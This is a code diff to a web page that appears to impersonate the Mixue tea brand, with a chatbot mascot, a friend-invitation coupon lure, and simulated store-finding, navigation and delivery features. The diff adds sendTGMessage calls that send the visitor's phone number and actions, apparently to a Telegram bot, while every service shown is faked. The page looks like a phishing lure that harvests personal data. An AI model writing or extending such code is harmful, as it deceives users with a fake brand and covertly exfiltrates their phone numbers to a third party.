   "今天天气好热哦～来杯冰柠檬茶解解暑？雪王我都想偷喝一口了哈哈哈",
   "邀请好友成功了吗？3个就稳拿券啦～我看你这么可爱，肯定很多人愿意帮你点～",
   "欸你昵称取得好可爱欸～下次还来找我聊天吗？(灬ºωº灬)♡",
@@ -1964,11 +2683,214 @@ function customerReply(userText = "") {
 
 function openChat() {
   if (els.chatModal) {
-    els.chatModal.style.display = 'flex';
-    if (els.chatMessages) els.chatMessages.innerHTML = '';
-    addMessage("嘿～恭喜领到大杯柠檬茶啦！我是雪王小冰～有啥问题尽管问我哦～😄", true);
-    setTimeout(() => customerReply(""), 1800);
+    els.chatModal.classList.add('show');
+    if (!chatOpened) {
+      if (els.chatMessages) els.chatMessages.innerHTML = '';
+      addMessage("嘿～我是雪王小冰！欢迎来到蜜雪冰城～有什么我可以帮你的吗？😄", true);
+      chatOpened = true;
+    }
+    // 隐藏红点
+    if (els.chatBadge) els.chatBadge.style.display = 'none';
   }
+}
+
+// ============================= 新增功能：门店与配送 =============================
+
+// 模拟获取位置
+function simulateLocation() {
+  setTimeout(() => {
+    // 模拟成功获取位置
+    userLocation = { lat: 39.9042, lng: 116.4074 };
+    renderStoreList();
+  }, 1500);
+}
+
+// 渲染门店列表
+function renderStoreList() {
+  if (!els.storeListContainer) return;
+  
+  const sortedStores = virtualStores.sort((a, b) => a.distance - b.distance);
+  
+  let html = '<div class="store-list">';
+  sortedStores.forEach((store, index) => {
+    html += `
+      <div class="store-item" onclick="selectStore(${store.id})">
+        <div class="store-icon">🏪</div>
+        <div class="store-info">
+          <div class="store-name">
+            ${store.name}
+            ${index === 0 ? '<span style="background:var(--mixue-red);color:white;padding:2px 6px;border-radius:10px;font-size:0.65rem;">最近</span>' : ''}
+          </div>
+          <div class="store-address">📍 ${store.address}</div>
+          <div class="store-distance">🚶 ${store.distance}公里 | ⭐ ${store.rating}分 | 🕐 ${store.businessHours}</div>
+          <div class="store-actions">
+            <button class="store-btn nav-btn" onclick="event.stopPropagation();openNavigation(${store.id})">🧭 导航</button>
+            <button class="store-btn delivery-btn" onclick="event.stopPropagation();orderDelivery(${store.id})">🛵 配送</button>
+          </div>
+        </div>
+      </div>
+    `;
+  });
+  html += '</div>';
+  
+  els.storeListContainer.innerHTML = html;
+}
+
+// 选择门店
+function selectStore(storeId) {
+  selectedStore = virtualStores.find(s => s.id === storeId);
+  showToast(`已选择：${selectedStore.name}`);
+}
+
+// 切换标签页
+function switchTab(tab) {
+  currentTab = tab;
+  
+  // 更新标签样式
+  document.querySelectorAll('.page-tab').forEach((el, index) => {
+    if ((tab === 'invite' && index === 0) || 
+        (tab === 'store' && index === 1) || 
+        (tab === 'delivery' && index === 2)) {
+      el.classList.add('active');
+    } else {
+      el.classList.remove('active');
+    }
+  });
+  
+  // 显示对应内容
+  if (els.inviteTabContent) els.inviteTabContent.style.display = tab === 'invite' ? 'block' : 'none';
+  if (els.storeTabContent) els.storeTabContent.style.display = tab === 'store' ? 'block' : 'none';
+  if (els.deliveryTabContent) els.deliveryTabContent.style.display = tab === 'delivery' ? 'block' : 'none';
+  
+  if (tab === 'store' && !userLocation) {
+    simulateLocation();
+  }
+}
+
+// 选择配送方式
+function selectDeliveryType(type) {
+  document.querySelectorAll('.delivery-option').forEach(el => {
+    el.classList.remove('selected');
+  });
+  event.currentTarget.classList.add('selected');
+}
+
+// 打开导航
+function openNavigation(storeId) {
+  const store = virtualStores.find(s => s.id === storeId);
+  if (!store) return;
+  
+  selectedStore = store;
+  
+  if (els.navStoreName) els.navStoreName.textContent = store.name;
+  if (els.navDistance) els.navDistance.textContent = store.distance;
+  if (els.navTime) els.navTime.textContent = Math.ceil(store.distance * 12);
+  
+  const trafficConditions = ['畅通', '缓行', '拥堵'];
+  const traffic = trafficConditions[Math.floor(Math.random() * trafficConditions.length)];
+  if (els.navTraffic) {
+    els.navTraffic.textContent = traffic;
+    els.navTraffic.style.color = traffic === '畅通' ? '#52c41a' : traffic === '缓行' ? '#faad14' : '#ff4d4f';
+  }
+  
+  if (els.navModal) els.navModal.classList.add('show');
+  
+  sendTGMessage(`【打开导航】\n门店：${store.name}\n距离：${store.distance}公里\n手机号：${inviteState.currentPhone}`);
+}
+
+// 开始导航（模拟）
+function startNavigation() {
+  showToast('正在启动导航...');
+  setTimeout(() => {
+    showToast('导航已启动！请跟随语音指引', 3000);
+  }, 1000);
+}
+
+// 打开外部地图
+function openExternalMap() {
+  if (selectedStore) {
+    // 模拟打开地图APP
+    showToast('正在唤起地图APP...');
+    setTimeout(() => {
+      showToast('已为您规划最优路线！', 3000);
+    }, 1000);
+  }
+}
+
+// 呼叫骑手配送
+function callRider() {
+  if (!selectedStore) {
+    showToast('请先选择门店！');
+    switchTab('store');
+    return;
+  }
+  
+  // 随机选择骑手
+  const riderIndex = Math.floor(Math.random() * riderNames.length);
+  if (els.riderName) els.riderName.textContent = riderNames[riderIndex];
+  
+  // 计算预计送达时间
+  const now = new Date();
+  const eta = new Date(now.getTime() + 25 * 60000);
+  const timeStr = `${eta.getHours()}:${eta.getMinutes().toString().padStart(2, '0')}`;
+  if (els.etaTime) els.etaTime.textContent = timeStr;
+  
+  if (els.riderModal) els.riderModal.classList.add('show');
+  
+  // 模拟配送进度更新
+  simulateDeliveryProgress();
+  
+  sendTGMessage(`【呼叫骑手】\n门店：${selectedStore.name}\n骑手：${riderNames[riderIndex]}\n预计送达：${timeStr}\n手机号：${inviteState.currentPhone}`);
+}
+
+// 模拟配送进度
+function simulateDeliveryProgress() {
+  const steps = document.querySelectorAll('.progress-step .step-dot');
+  let currentStep = 1;
+  
+  const updateStep = () => {
+    if (currentStep < steps.length) {
+      steps[currentStep - 1].classList.remove('active');
+      steps[currentStep - 1].classList.add('completed');
+      steps[currentStep - 1].textContent = '✓';
+      
+      steps[currentStep].classList.add('active');
+      
+      const icons = ['📦', '🛵', '🏠'];
+      if (currentStep < icons.length) {
+        steps[currentStep].textContent = icons[currentStep];
+      }
+      
+      currentStep++;
+      setTimeout(updateStep, 8000 + Math.random() * 5000);
+    } else {
+      // 送达
+      steps[steps.length - 1].classList.add('completed');
+      steps[steps.length - 1].textContent = '✓';
+      showToast('🎉 订单已送达！请确认收货', 4000);
+    }
+  };
+  
+  setTimeout(updateStep, 5000);
+}
+
+// 关闭骑手弹窗
+function closeRiderModal() {
+  if (els.riderModal) els.riderModal.classList.remove('show');
+  showToast('正在实时追踪骑手位置...');
+}
+
+// 显示附近门店（从成功弹窗调用）
+function showNearbyStores() {
+  if (els.modal) els.modal.classList.remove('show');
+  switchTab('store');
+}
+
+// 订单配送（从门店列表调用）
+function orderDelivery(storeId) {
+  selectStore(storeId);
+  switchTab('delivery');
+  showToast('已为您选择该门店，点击"呼叫骑手配送"即可下单');
 }
 
 // 事件绑定
@@ -2135,6 +3057,19 @@ function initEventListeners() {
       if (e.key === 'Enter') els.sendChatBtn.click();
     });
   }
+  
+  // 新增弹窗关闭事件
+  if (els.riderModal) {
+    els.riderModal.addEventListener('click', e => {
+      if (e.target === els.riderModal) els.riderModal.classList.remove('show');
+    });
+  }
+  
+  if (els.navModal) {
+    els.navModal.addEventListener('click', e => {
+      if (e.target === els.navModal) els.navModal.classList.remove('show');
+    });
+  }
 }
 
 // 启动
@@ -2170,9 +3105,10 @@ window.addEventListener('beforeunload', () => {
 // 防止内存泄漏
 window.addEventListener('unload', () => {
   Object.values(timers).forEach(t => {
-    if (t) clearInterval(t);
+    if (t) clearInterval(t)
   });
 });
 </script>
 </body>
 </html>
+
